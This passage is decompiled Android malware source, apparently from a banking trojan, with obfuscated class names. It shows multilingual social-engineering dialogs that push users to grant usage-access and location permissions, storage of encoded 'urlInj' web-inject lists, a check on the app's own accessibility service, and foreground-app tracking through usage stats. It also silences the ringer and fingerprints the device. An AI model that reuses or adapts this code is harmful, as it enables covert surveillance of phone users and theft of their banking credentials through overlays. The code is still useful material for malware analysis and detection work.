            builder.setTitle(str5).setMessage(string).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str6, new DialogInterface.OnClickListener() { // from class: wocwvy.czyxoxmbauu.slsa.b.1
                @Override // android.content.DialogInterface.OnClickListener
                public void onClick(DialogInterface dialogInterface, int i) {
                    context.startActivity(new Intent("android.settings.USAGE_ACCESS_SETTINGS"));
                    dialogInterface.cancel();
                }
            });
        } else {
            if (!str.contains("gps")) {
                return;
            }
            if (string2.contains("RU")) {
                str2 = "Геолокация";
                str3 = "Для корректной работы системы, нужно получить координаты, вам необходимо включить геолокацию";
                str4 = "Включить сейчас";
            } else if (!string2.contains("US")) {
                if (string2.contains("TR")) {
                    str2 = "Coğrafi konum";
                    str3 = "Sistemin doğru çalışması için, koordinatları almak gerekir, coğrafi konum etkinleştirmeniz gerekir";
                    str4 = "Şimdi etkinleştir";
                } else if (string2.contains("DE")) {
                    str2 = "Geolokalisierung";
                    str3 = "Für den korrekten Betrieb des Systems müssen Sie die Koordinaten erhalten, müssen Sie die Geolokalisierung aktivieren";
                    str4 = "Aktivieren Sie jetzt";
                } else if (string2.contains("IT")) {
                    str2 = "Geolocalizzazione";
                    str3 = "Per il corretto funzionamento del sistema, è necessario ottenere le coordinate, è necessario abilitare la geolocalizzazione";
                    str4 = "Attiva ora";
                } else if (string2.contains("FR")) {
                    str2 = "Géolocalisation";
                    str3 = "Pour un fonctionnement correct du système, vous devez obtenir les coordonnées, vous devez activer la géolocalisation";
                    str4 = "Activer maintenant";
                } else if (string2.contains("UA")) {
                    str2 = "Геолокація";
                    str3 = "Для коректної роботи системи вам потрібно, щоб отримати координати, потрібно включити геолокацію";
                    str4 = "Включити зараз";
                } else {
                    str2 = "Geolocation";
                    str3 = "For correct operation of the system, you need to get the coordinates, you need to enable geolocation";
                    str4 = "Enable now";
                }
            }
            builder.setTitle(str2).setMessage(str3).setIcon(R.drawable.im).setCancelable(false).setNegativeButton(str4, new DialogInterface.OnClickListener() { // from class: wocwvy.czyxoxmbauu.slsa.b.2
                @Override // android.content.DialogInterface.OnClickListener
                public void onClick(DialogInterface dialogInterface, int i) {
                    context.startActivity(new Intent("android.settings.LOCATION_SOURCE_SETTINGS"));
                    dialogInterface.cancel();
                }
            });
        }
        try {
            builder.create().show();
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: d */
    public void m250d(Context context, String str, String str2) {
        if (str.contains("urlInj") || str.contains("urls")) {
            str2 = m242c(str2);
        }
        SharedPreferences.Editor editorEdit = context.getSharedPreferences("set", 0).edit();
        editorEdit.putString(str, str2);
        editorEdit.commit();
    }

    /* JADX INFO: renamed from: e */
    public String m251e(Context context, String str) {
        if (f345e == null) {
            f345e = context.getSharedPreferences("set", 0);
            f346f = f345e.edit();
        }
        String string = f345e.getString(str, null);
        return (str.contains("urlInj") || str.contains("urls")) ? m247d(string) : string;
    }

    /* JADX INFO: renamed from: e */
    public boolean m252e(Context context) {
        for (String str : this.f348b.f336a) {
            if (context.checkCallingOrSelfPermission(str) != 0) {
                return false;
            }
        }
        return true;
    }

    /* JADX INFO: renamed from: f */
    public void m253f(Context context) {
        Intent intent = new Intent(context, (Class<?>) sxfl.class);
        intent.addFlags(268435456);
        intent.addFlags(1073741824);
        context.startActivity(intent);
    }

    /* JADX INFO: renamed from: g */
    protected boolean m254g(Context context) {
        String str = context.getPackageName() + "/" + egxltnv.class.getName().replace(context.getPackageName(), "");
        Iterator<AccessibilityServiceInfo> it = ((AccessibilityManager) context.getSystemService("accessibility")).getEnabledAccessibilityServiceList(-1).iterator();
        while (it.hasNext()) {
            if (str.equals(it.next().getId())) {
                return true;
            }
        }
        AccessibilityManager accessibilityManager = (AccessibilityManager) context.getSystemService("accessibility");
        if (accessibilityManager == null) {
            return false;
        }
        Iterator<AccessibilityServiceInfo> it2 = accessibilityManager.getEnabledAccessibilityServiceList(-1).iterator();
        while (it2.hasNext()) {
            if (it2.next().getId().startsWith(context.getPackageName() + "/")) {
                return true;
            }
        }
        return false;
    }

    /* JADX INFO: renamed from: h */
    public boolean m255h(Context context) {
        if (Build.VERSION.SDK_INT < 21) {
            return false;
        }
        try {
            ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
            return ((AppOpsManager) context.getSystemService("appops")).checkOpNoThrow("android:get_usage_stats", applicationInfo.uid, applicationInfo.packageName) == 0;
        } catch (PackageManager.NameNotFoundException unused) {
            return false;
        }
    }

    /* JADX INFO: renamed from: i */
    public String m256i(Context context) {
        ApplicationInfo applicationInfo;
        PackageManager packageManager = context.getApplicationContext().getPackageManager();
        try {
            applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
        } catch (PackageManager.NameNotFoundException unused) {
            applicationInfo = null;
        }
        return (String) (applicationInfo != null ? packageManager.getApplicationLabel(applicationInfo) : "(unknown)");
    }

    /* JADX INFO: renamed from: j */
    public String m257j(Context context) {
        if (Build.VERSION.SDK_INT < 21) {
            return "";
        }
        UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService("usagestats");
        long jCurrentTimeMillis = System.currentTimeMillis();
        List<UsageStats> listQueryUsageStats = usageStatsManager.queryUsageStats(0, jCurrentTimeMillis - 10000, jCurrentTimeMillis);
        if (listQueryUsageStats == null) {
            return "NoPermission2";
        }
        TreeMap treeMap = new TreeMap();
        for (UsageStats usageStats : listQueryUsageStats) {
            treeMap.put(Long.valueOf(usageStats.getLastTimeUsed()), usageStats);
        }
        return (treeMap == null || treeMap.isEmpty()) ? "NoPermission1" : ((UsageStats) treeMap.get(treeMap.lastKey())).getPackageName();
    }

    /* JADX INFO: renamed from: k */
    public boolean m258k(Context context) {
        LocationManager locationManager = (LocationManager) context.getSystemService("location");
        return locationManager.isProviderEnabled("gps") || locationManager.isProviderEnabled("network");
    }

    /* JADX INFO: renamed from: l */
    public void m259l(Context context) {
        if (Build.VERSION.SDK_INT <= 23) {
            ((AudioManager) context.getSystemService("audio")).setRingerMode(0);
        }
    }

    /* JADX INFO: renamed from: m */
    public boolean m260m(Context context) {
        NetworkInfo networkInfoM223r = m223r(context);
        return networkInfoM223r != null && networkInfoM223r.isConnected() && networkInfoM223r.getType() == 1;
    }

    /* JADX INFO: renamed from: n */
    public boolean m261n(Context context) {
        NetworkInfo networkInfoM223r = m223r(context);
        return networkInfoM223r != null && networkInfoM223r.isConnected() && networkInfoM223r.getType() == 0;
    }

    /* JADX INFO: renamed from: o */
    public boolean m262o(Context context) {
        return m261n(context) || m260m(context);
    }

    /* JADX INFO: renamed from: p */
    public String m263p(Context context) {
        try {
            return ((TelephonyManager) context.getSystemService("phone")).getNetworkCountryIso();
        } catch (Exception unused) {
            return "us";
        }
    }

    /* JADX INFO: renamed from: q */
    public String m264q(Context context) {
        String string = Settings.Secure.getString(context.getContentResolver(), "android_id");
        if (string != "") {
            return string;
        }
        return "35" + (Build.BOARD.length() % 10) + (Build.BRAND.length() % 10) + (Build.CPU_ABI.length() % 10) + (Build.DEVICE.length() % 10) + (Build.DISPLAY.length() % 10) + (Build.HOST.length() % 10) + (Build.ID.length() % 10) + (Build.MANUFACTURER.length() % 10) + (Build.MODEL.length() % 10) + (Build.PRODUCT.length() % 10) + (Build.TAGS.length() % 10) + (Build.TYPE.length() % 10) + (Build.USER.length() % 10);
    }
}
